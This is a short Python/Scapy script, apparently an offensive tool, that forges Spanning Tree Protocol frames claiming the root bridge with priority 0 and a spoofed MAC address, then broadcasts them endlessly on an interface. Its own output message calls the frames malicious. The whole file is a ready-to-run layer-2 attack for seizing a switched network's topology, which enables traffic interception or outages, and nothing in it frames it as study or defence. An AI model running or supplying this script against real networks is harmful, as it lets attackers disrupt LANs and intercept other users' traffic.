from scapy.all import *

def stp_poison():
    bpdu = (
        Dot3(dst="01:80:c2:00:00:00", src="aa:aa:aa:aa:aa:aa") /
        LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
        STP(proto=0, version=0, bpdutype=0, bpduflags=0,
            rootid=0, rootmac="aa:aa:aa:aa:aa:aa",
            pathcost=0, bridgeid=0, bridgemac="aa:aa:aa:aa:aa:aa",
            portid=0x8001, age=0, maxage=20, hellotime=2, fwddelay=15)
    )
    print("[*] Envoi de trames STP malveillantes...")
    sendp(bpdu, iface="eth0", loop=1, inter=2, verbose=1)

if __name__ == "__main__":
    stp_poison()
EOF